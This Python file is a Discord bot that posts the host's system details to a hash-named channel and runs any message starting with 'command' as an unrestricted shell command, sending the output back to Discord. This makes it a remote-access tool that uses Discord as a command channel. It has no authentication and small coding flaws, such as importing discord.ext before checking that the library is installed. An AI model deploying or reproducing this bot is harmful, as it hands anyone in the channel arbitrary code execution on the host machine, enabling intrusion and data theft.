import subprocess
import sys
import os
import platform
import hashlib
from discord.ext import commands

try:
    import discord
except ImportError:
    print("discord.py library not found. Installing...")
    subprocess.check_call(
        [sys.executable, "-m", "pip", "install", "discord.py"])

# Define your intents
intents = discord.Intents.default()
intents.messages = True
intents.message_content = True  # Enable message content intent

# Check if the bot token is available in the environment variables
TOKEN = os.environ.get('BOT_TOKEN')

# If not found, prompt the user for the token
if not TOKEN:
    TOKEN = input("Enter your bot token: ")
    # Save the token in the environment variable for future use
    os.environ['BOT_TOKEN'] = TOKEN

# Create an instance of the bot with intents
bot = commands.Bot(command_prefix='', intents=intents)
bot.text_channel = None  # Initialize the bot's text channel attribute

# Event handler when the bot is ready


@bot.event
async def on_ready():
    print(f'We have logged in as {bot.user.name}')

    # Create a text channel with the first 7 letters of the bot's hash
    hash_object = hashlib.md5(bot.user.name.encode())
    channel_name = hash_object.hexdigest()[:7]
    guild = bot.guilds[0]  # Assuming the bot is only in one guild

    # Check if the channel already exists
    existing_channel = discord.utils.get(
        guild.channels, name=channel_name, type=discord.ChannelType.text)
    if existing_channel:
        bot.text_channel = existing_channel
    else:
        bot.text_channel = await guild.create_text_channel(channel_name)

    # Send system information in the created channel
    try:
        await system_info(bot.text_channel)
    except Exception as e:
        print(f'Error sending system information: {e}')

# Event handler for processing messages


@bot.event
async def on_message(message):
    # Check if the message is from a bot to avoid infinite loops
    if message.author.bot:
        return

    # Check if the message starts with the command prefix
    if message.content.lower().startswith('command'):
        command = message.content[len('command'):].strip()
        await execute_command(message.channel, command)

        # Explicitly return here to avoid processing the command twice
        return

    # Continue with the normal command processing
    await bot.process_commands(message)

# Define a command to execute system commands


@bot.command(name='command')
async def execute_command(ctx, *args):
    command = ' '.join(args)  # Combine all arguments into a single string
    try:
        # Execute the system command
        result = subprocess.check_output(command, shell=True, text=True)
        await ctx.send(f"""``{result}``""")
    except subprocess.CalledProcessError as e:
        await ctx.send(f"""``{e}``""")

# Define a command to get system information and generate a hash


@bot.command(name='systeminfo')
async def system_info(ctx):
    try:
        system_info = f"System: {platform.system()} {platform.version()}\n"
        system_info += f"Machine: {platform.machine()}\n"
        system_info += f"Processor: {platform.processor()}"

        # Generate a hash of the system information
        hash_object = hashlib.md5(system_info.encode())
        system_hash = hash_object.hexdigest()

        await ctx.send(f"System Information:\n```\n{system_info}\n```\nSystem Hash: {system_hash}")
    except Exception as e:
        await ctx.send(f'Error getting system information:\n```\n{e}\n```')

# Run the bot with the token
bot.run(TOKEN)
